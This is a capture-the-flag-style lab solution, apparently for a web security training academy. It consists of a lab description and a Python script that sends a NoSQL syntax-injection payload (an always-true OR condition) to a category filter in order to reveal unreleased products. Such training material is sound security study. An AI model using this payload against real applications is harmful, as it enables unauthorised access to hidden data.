# Detecting NoSQL injection

> The product category filter for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.
> To solve the lab, perform a NoSQL injection attack that causes the application to display unreleased products.

```python
import requests
import sys

# --- Configuration ---
# Lab: Detecting NoSQL injection
# GOAL: Inject a boolean condition to bypass the category filter and reveal unreleased products.
BASE_URL = "https://0a3100fb041be4f9804d0da500b800fa.web-security-academy.net"

def exploit_nosql_syntax(base_url):
    """
    Exploits a MongoDB Syntax Injection to dump all documents.
    """
    filter_endpoint = f"{base_url}/filter"
    
    # 1. Establish Baseline (Normal Behavior)
    # We request a valid category to see how much data is normally returned.
    valid_category = "Gifts"
    print(f"[*] Establishing baseline for category: '{valid_category}'...")
    
    baseline_response = requests.get(filter_endpoint, params={"category": valid_category})
    baseline_length = len(baseline_response.text)
    print(f"[*] Baseline Response Length: {baseline_length} bytes")

    # 2. Construct Payload
    # Syntax: We break the string using a single quote '
    # Logic: We add an OR condition that is always TRUE (|| '1' == '1')
    # MongoDB Query becomes: this.category == 'Gifts' || '1'=='1'
    payload_string = "Gifts'||'1'=='1"
    
    params = {
        "category": payload_string
    }

    # 3. Execute Attack
    print(f"[*] Sending Payload: {payload_string}")
    attack_response = requests.get(filter_endpoint, params=params)
    attack_length = len(attack_response.text)
    
    print(f"[*] Attack Response Length: {attack_length} bytes")

    # 4. Verification
    # If the attack worked, the response should be significantly larger 
    # because it now includes ALL products (including hidden ones), not just 'Gifts'.
    if attack_response.status_code == 200:
        if attack_length > baseline_length:
            print("[+] SUCCESS: Response is larger than baseline.")
            print("[+] Injection successful. Unreleased products revealed.")
            print("[+] Lab should be solved.")
        else:
            print("[-] FAIL: Response length did not increase.")
    else:
        print(f"[-] Request failed with status code: {attack_response.status_code}")

if __name__ == "__main__":
    exploit_nosql_syntax(BASE_URL)
```